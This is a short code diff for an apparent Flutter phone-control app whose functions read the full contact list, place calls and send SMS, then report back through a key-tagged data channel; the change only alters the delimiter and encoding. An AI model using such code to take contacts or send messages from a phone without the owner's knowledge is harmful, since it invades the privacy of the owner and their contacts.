@@ -8,7 +8,7 @@ import 'package:permission_handler/permission_handler.dart';
 import 'package:url_launcher/url_launcher_string.dart';
 
 Future<void> contacts(String name) async {
-  String message = 'contacts¬$authentication_key¬';
+  String message = 'contacts|$authentication_key|';
 
   if (await Permission.contacts.request().isGranted) {
     Iterable<Contact> contacts = await ContactsService.getContacts();
@@ -25,22 +25,15 @@ Future<void> contacts(String name) async {
     message += 'Please grant me permission to access your contacts';
   }
 
-  Uint8List return_value = Uint8List.fromList(message.codeUnits);
-
-  write_data(return_value);
+  write_data(message);
 }
 
 Future<void> call(String phone_number) async {
-  Uint8List return_value =
-      Uint8List.fromList('call¬$authentication_key¬'.codeUnits);
-
   launchUrlString("tel://$phone_number");
-  write_data(return_value);
+  write_data('call|$authentication_key|');
 }
 
 Future<void> text(String phone_number, message) async {
-  Uint8List return_value =
-      Uint8List.fromList('text¬$authentication_key¬'.codeUnits);
   await sendSMS(message: message, recipients: [phone_number]);
-  write_data(return_value);
+  write_data('text|$authentication_key|');
 }
